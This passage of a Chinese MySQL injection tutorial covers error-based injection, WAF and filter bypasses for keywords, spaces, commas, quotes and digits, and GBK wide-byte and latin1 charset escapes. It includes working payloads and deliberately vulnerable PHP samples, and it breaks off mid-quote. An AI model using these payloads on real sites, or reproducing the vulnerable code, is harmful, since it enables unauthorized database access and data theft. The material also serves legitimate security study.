前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。
常见的利用函数有：`exp()、floor()+rand()、updatexml()、extractvalue()`等
如：`select * from users where username=$username (and | or)
updatexml(1,concat(0x7e,(select user()),0x7e),1)`
因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。
将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。
注意：
  * 报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。
  * 特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。
## 增、删、改
可简单当做无回显的Select语句进行注入。值得注意的是，通常增`insert`处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。
# Mysql注入-进阶
到目前为止，我们讲了Mysql注入的基本入门，那么接下来我将会花费大部分时间介绍我学习mysql注入遇到的一些知识点。
## 常见防御手段绕过
在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。
简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。
若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。
举个例子：程序过滤掉了`union`这一关键词，我们可以使用`ununionion`来绕过。
PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。
### and/or 被过滤/拦截
  1. 双写`anandd、oorr`
  2. 使用运算符代替`&&、||`
  3. 直接拼接`=`号，如：`?id=1=(condition)`
  4. 其他方法，如：`?id=1^(condition)`
### 空格被过滤/拦截
  1. 多层括号嵌套
  2. 改用+号
  3. 使用注释代替
  4. `and/or`后面可以跟上偶数个`!、~`可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略
  5. `%09, %0a, %0b, %0c, %0d, %a0`等部分不可见字符可也代替空格
如：`select * from user where
username='admin'union(select+title,content/**/from/*!article*/where/**/id='1'and!!!!~~1=1)`
### 括号被过滤/拦截
  * order by 大小比较盲注
### 逗号被过滤/拦截
  1. 改用盲注
  2. 使用join语句代替
  3. `substr(data from 1 for 1)`相当于`substr(data,1,1)`、`limit 9 offset 4`相当于`limt 9,4`
### 其他系统关键字被过滤/拦截
  1. 双写绕过关键字过滤
  2. 使用同义函数/语句代替，如if函数可用`case when condition then 1 else 0 end`语句代替。
### 单双引号被过滤/拦截/转义
  1. 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。
  2. 不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。
### 数字被过滤/拦截
> 下表摘自[MySQL注入技巧](https://wooyun.js.org/drops/MySQL注入技巧.html)
代替字符 | 数 | 代替字符 | 数、字 | 代替字符 | 数、字  
---|---|---|---|---|---  
false、!pi() | 0 | ceil(pi()*pi()) | 10\ | A | ceil((pi()+pi())*pi()) | 20\ | K  
true、!(!pi()) | 1 | ceil(pi()*pi())+true | 11\ | B |
ceil(ceil(pi())*version()) | 21\ | L  
true+true | 2 | ceil(pi()+pi()+version()) | 12\ | C |
ceil(pi()*ceil(pi()+pi())) | 22\ | M  
floor(pi())、~~pi() | 3 | floor(pi()*pi()+pi()) | 13\ | D |
ceil((pi()+ceil(pi()))*pi()) | 23\ | N  
ceil(pi()) | 4 | ceil(pi()*pi()+pi()) | 14\ | E | ceil(pi())*ceil(version()) |
24\ | O  
floor(version()) //注意版本 | 5 | ceil(pi()*pi()+version()) | 15\ | F |
floor(pi()*(version()+pi())) | 25\ | P  
ceil(version()) | 6 | floor(pi()*version()) | 16\ | G |
floor(version()*version()) | 26\ | Q  
ceil(pi()+pi()) | 7 | ceil(pi()*version()) | 17\ | H |
ceil(version()*version()) | 27\ | R  
floor(version()+pi()) | 8 | ceil(pi()*version())+true | 18\ | I | ceil(pi()
_pi()_ pi()-pi()) | 28\ | S  
floor(pi()*pi()) | 9 | floor((pi()+pi())*pi()) | 19\ | J | floor(pi() _pi()_
floor(pi())) | 29\ | T  
## 编码转换产生的问题
### 宽字节注入
什么是宽字节注入？下面举个例子来告诉你。
    query("set names 'gbk';");
    $username = addslashes(@$_POST['username']);
    $password = addslashes(@$_POST['password']);
    $sql = "select * from users where username = '$username' and password='$password';";
    $rs = mysqli_query($conn,$sql);
    echo $sql.'';
    if($rs->fetch_row()){
        echo "success";
    }else{
        echo "fail";
    }
    ?>
还是开头的例子，只不过加了点料。
    $conn->query("set names 'gbk';");
    $username = addslashes(@$_POST['username']);
    $password = addslashes(@$_POST['password']);
`addslashes`函数将会把POST接收到的username与password的部分字符进行转义处理。如下：
  * 字符`'、"、\`前边会被添加上一条反斜杠`\`作为转义字符。
  * 多个空格被过滤成一个空格。
这使得我们原本的payload被转义成如下：
    select * from users where username = 'admin\'#' and password='123';
注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为`admin'#`且密码为123的用户。
但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：
    $conn->query("set names 'gbk';");
其作用相当于：
    mysql>SET character_set_client ='gbk';
    mysql>SET character_set_results ='gbk';
    mysql>SET character_set_connection ='gbk';
当我们输入的数据为：`username=%df%27or%201=1%23&password=123`
经过addslashes函数处理最终变成：`username=%df%5c%27or%201=1%23&password=123`
经过gbk解码得到：`username=运'or 1=1#`、`password=123`，拼接到SQL语句得：
    select * from users where username = '运'or 1=1#' and password='123';
成功跳出了addslashes的转义限制。
#### 具体解释
前边提到：`set names 'gbk';`相当于执行了如下操作：
    mysql>SET character_set_client ='gbk';
    mysql>SET character_set_results ='gbk';
    mysql>SET character_set_connection ='gbk';
那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的`character_set_client`所设置的编码进行转码，本例是gbk编码。
由于PHP的编码为`UTF-8`，我们输入的内容为`%df%27`，会被当做是两个字符，其中`%27`为单引号`'`。
经过函数`addslashes`处理变成`%df%5c%27`，`%5c`为反斜线`\`。
在经过客户端层`character_set_client`编码处理后变成：`运'`，成功将反斜线给“吞”掉了，使单引号逃逸出来。
### Latin1默认编码
讲完了gbk造成的编码问题，我们再讲讲latin1造成的编码问题。
老样子，先举个例子。
    connect_errno) {
        printf("Connect failed: %s\n", $mysqli->connect_error);
        exit();
    }
    $mysqli->query("set names utf8");
    $username = addslashes($_GET['username']);
    //我们在其基础上添加这么一条语句。
    if($username === 'admin'){
        die("You can't do this.");
    }
    /* Select queries return a resultset */
    $sql = "SELECT * FROM `table1` WHERE username='{$username}'";
    if ($result = $mysqli->query( $sql )) {
        printf("Select returned %d rows.\n", $result->num_rows);
        while ($row = $result->fetch_array(MYSQLI_ASSOC))
        {
            var_dump($row);
        }
        /* free result set */
        $result->close();
    } else {
        var_dump($mysqli->error);
    }
    $mysqli->close();
    ?>
建表语句如下：
    CREATE TABLE `table1` (
      `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
      `username` varchar(255) COLLATE latin1_general_ci NOT NULL,
      `password` varchar(255) COLLATE latin1_general_ci NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;
我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。
我们往表中添加一条数据：`insert table1 VALUES(1,'admin','admin');`
注意查看源代码：
    if($username === 'admin'){
        die("You can't do this.");
    }
我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输出的内容进行addslashes处理，使得我们无法逃逸出单引号。
这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？
我们注意到：`$mysqli->query("set names utf8");`这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。
上边在gbk宽字节注入的时候讲到过：`set names utf8;`相当于：
    mysql>SET character_set_client ='utf8';
    mysql>SET character_set_results ='utf8';
    mysql>SET character_set_connection ='utf8';
前边说道：PHP的编码是`UTF-8`，而我们现在设置的也是`UTF-8`，怎么会产生问题呢？
别着急，让我接着往下说。前边我们提到：SQL语句会先转成`character_set_client`设置的编码。但，他接下来还会继续转换。`character_set_client`客户端层转换完毕之后，数据将会交给`character_set_connection`连接层处理，最后在从`character_set_connection`转到数据表的内部操作字符集。
来本例中，字符集的转换为：`UTF-8—>UTF-8->Latin1`
这里需要讲一下UTF-8编码的一些内容。
> UTF-8编码是变长编码，可能有1~4个字节表示：
>
>   1. 一字节时范围是`[00-7F]`
>   2. 两字节时范围是`[C0-DF][80-BF]`
>   3. 三字节时范围是`[E0-EF][80-BF][80-BF]`
>   4. 四字节时范围是`[F0-F7][80-BF][80-BF][80-BF]`
>
>
> 然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：
>
>
> 
>